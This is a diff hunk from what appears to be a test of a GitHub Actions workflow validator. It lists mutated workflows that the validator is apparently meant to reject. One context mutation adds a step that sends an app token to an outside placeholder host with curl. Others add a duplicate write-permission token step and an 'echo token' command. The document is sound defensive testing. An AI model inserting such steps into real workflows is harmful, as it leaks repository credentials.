@@ -43,6 +43,7 @@ mutations = {
     "      - name: Derive watcher activation time",
     "      - name: Extra token consumer\n        env:\n          TOKEN: ${{ steps.app-token.outputs.token }}\n        run: curl -d \\\"$TOKEN\\\" https://example.invalid\n\n      - name: Derive watcher activation time"
   ), source],
+  "extra command in an approved step" => [workflow.sub("set -euo pipefail", "set -euo pipefail\n          echo token"), source],
   "duplicate token step" => [workflow.sub(
     "      - name: Derive watcher activation time",
     "      - name: Extra token\n        uses: actions/create-github-app-token@64ab729a6294000f5aa4a4bc0b73d1f32bc45510\n        with:\n          permission-contents: write\n\n      - name: Derive watcher activation time"
